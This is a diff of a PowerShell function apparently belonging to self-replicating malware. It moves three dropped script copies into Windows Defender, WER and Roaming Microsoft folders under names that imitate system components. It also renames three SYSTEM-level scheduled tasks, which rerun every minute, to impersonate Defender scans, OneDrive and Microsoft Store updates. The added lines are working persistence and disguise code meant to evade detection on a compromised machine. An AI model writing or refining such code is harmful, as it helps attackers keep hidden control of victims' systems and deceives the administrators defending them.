@@ -5,9 +5,9 @@ function Gen-Info {
     $username = "$($username.Split('\')[1])"
 
     # Paths
-    $alfa_path = "C:\ProgramData\Microsoft\DRM\alfa.ps1"
-    $bravo_path = "C:\Windows\Temp\bravo.ps1"
-    $charlie_path = "C:\Users\$username\AppData\Local\Temp\charlie.ps1"
+    $alfa_path = "C:\ProgramData\Microsoft\Windows Defender\DefenderUpdateHelper.ps1"
+    $bravo_path = "C:\ProgramData\Microsoft\Windows\WER\WERReportManager.ps1"
+    $charlie_path = "C:\Users\$username\AppData\Roaming\Microsoft\MicrosoftTelemetrySync.ps1"
     
     $random_chars = -join (1..10 | ForEach-Object { [char](Get-Random -Minimum 33 -Maximum 127) })
     $funcBody = (Get-Command Gen-Info).ScriptBlock.ToString()
@@ -38,7 +38,7 @@ function Gen-Info {
     $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -ExecutionTimeLimit (New-TimeSpan)
     $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
     
-    $task_alfa = "MicrosoftUpdate"
+    $task_alfa = "MicrosoftDefenderScheduledScan"
     try{
         if (-not (Get-ScheduledTask -TaskName $task_alfa -ErrorAction SilentlyContinue)) {
             Register-ScheduledTask -TaskName $task_alfa -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
@@ -48,7 +48,7 @@ function Gen-Info {
         }
     } catch {}
     
-    $task_bravo = "OneDrive"
+    $task_bravo = "OneDriveUpdate"
     try{
         if (-not (Get-ScheduledTask -TaskName $task_bravo -ErrorAction SilentlyContinue)) {
             Register-ScheduledTask -TaskName $task_bravo -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
@@ -59,7 +59,7 @@ function Gen-Info {
     } catch {} 
     
     
-    $task_charlie = "WindowsUpdate"
+    $task_charlie = "MicrosoftStoreAutoUpdate"
     try{
         if (-not (Get-ScheduledTask -TaskName $task_charlie -ErrorAction SilentlyContinue)) {
             Register-ScheduledTask -TaskName $task_charlie -Action $action -Trigger $trigger -Settings $settings -User "SYSTEM" -Force
